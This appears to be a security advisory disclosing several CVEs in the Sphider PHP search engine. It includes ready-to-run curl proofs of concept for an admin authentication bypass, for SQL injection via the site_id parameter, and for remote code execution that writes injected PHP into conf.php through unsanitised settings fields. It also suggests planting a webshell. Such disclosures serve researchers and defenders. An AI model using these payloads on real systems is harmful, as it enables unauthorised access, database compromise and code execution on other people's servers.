# Vendor Homepage: http://www.sphider.eu/
# Version: Sphider < 1.3.6 | Sphider Pro/Plus as well
# Tested on: Linux & Windows
# CVE : CVE-2014-5081, CVE-2014-5082, CVE-2014-5083, CVE-2014-5084, CVE-2014-5085, CVE-2014-5086, CVE-2014-5087

1. (patched April 2013), in all versions before 1.3.6 for sphider, 3.2 for sphider-pro, and 3.2 for sphider-plus,
existed an auth bypass in auth.php, the fix for this was adding an exit();. before that anyone could simply send credentials
that would not be validated and still login

PoC: curl -d "user=foo&pass=bar" "localhost/sphider/admin/admin.php"
(or auth.php)

CVE-2014-5081.
-------------------------------------------------------------------------------------------------------------------------------------

2. SQLi injection (exists in sphider/pro/plus [every version], not patched)..
A quick glance at the admin.php file shows that this software does not make many attempts to sanatize inputs, and thus leading to issues..
the following file is from sphider-1.3.6 | http://pastebin.com/raw.php?i=7NJQznmA
from: http://www.sphider.eu/sphider-1.3.6.zip

PoC: localhost:~$ curl -d "user=foo&pass=bar&f=20&site_id=1'" "http://localhost/sphider/admin/admin.php" | grep "MySQL"

You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''' at line 1

?f=20&site_id=SQLi
?f=index&adv=1&url=SQLi

and more..

CVE-2014-5082.
-------------------------------------------------------------------------------------------------------------------------------------

3. Remote Code Execution (the most severe..)
An RCE exists in every version of sphider/pro/plus and has not been patched, this is not as severe as before due to the fact that
you need authentication but combined with the previous auth bypass in older versions it can be quite dangerous. Not to mention
the possible chance of people keeping the default (admin:admin) login credentials. There is basically 107 instances of this "RCE",
it is due to sphider using fwrite to write / save the crawler's settings, the issue however is that there is complete lack of
sanatization...which means an attacker can simply feed sphider malicious PHP and it will be written into the conf.php
(localhost/sphider/settings/conf.php). In sphider plus/pro there is even more instances of fwrite in the configset.php
due to the more config options avaliable.

Example (from sphider-1.3.6):

fwrite($fhandle,"\n\n\n/*********************** \nWeights\n***********************/");
		fwrite($fhandle, "\n\n// Relative weight of a word in the title of a webpage\n");
		fwrite($fhandle,"$"."title_weight  = ".$_title_weight. ";");
		fwrite($fhandle, "\n\n// Relative weight of a word in the domain name\n");
		fwrite($fhandle,"$"."domain_weight = ".$_domain_weight. ";");
		fwrite($fhandle, "\n\n// Relative weight of a word in the path name\n");
		fwrite($fhandle,"$"."path_weight	= ".$_path_weight. ";");
		fwrite($fhandle, "\n\n// Relative weight of a word in meta_keywords\n");
		fwrite($fhandle,"$"."meta_weight	= ".$_meta_weight. ";");


		fwrite($fhandle,"?>");
		fclose($fhandle);

	}

as you can see the complete lack of santization here allows one to simply feed one of these fields arbitrary php and it will be written to conf.php; this code is reused in all sphider forks/clones

PoC: localhost:~$ curl -d "user=foo&pass=bar&f=settings&Submit=ion_nr=1.3.5&_language=en&_template=standard&_admin_email=admin%40localhost&_tmp_dir=tmp&_log_dir=log&_log_format=html&_min_words_per_page=10&_min_word_length=3&_word_upper_bound=100&_pdftotext_path=&_catdoc_path=&_xls2csv_path=&_catppt_path=&_user_agent=&_min_delay=0&_results_per_page=10&_cat_columns=2&_bound_search_result=0&_length_of_link_desc=0&_links_to_next=9&_desc_length=250&_suggest_rows=0&_title_weight=20&_domain_weight=60&_path_weight=10&_meta_weight=5;echo phpversion();" "http://localhost/sphider/admin/admin.php" | grep "5.3"

5.3.3<div id='submenu'>&nbsp;</div>

Obviously it can be taken a step further and one may inject a php-webshell into conf.php and further escalate..

There is another POSSIBLE RCE, (yes by code) however I have not been able to test it..this rce requires the file converter(s) to be installed, once they are...

admin/spiderfuncs.php:		$a = exec($command,$result, $retval);
admin/spiderfuncs.php:		$a = exec($command,$result, $retval);
admin/spiderfuncs.php:		$a = exec($command,$result, $retval);
admin/spiderfuncs.php:		$a = exec($command,$result, $retval);

once again the lack of sanatization allows possible remote code execution.
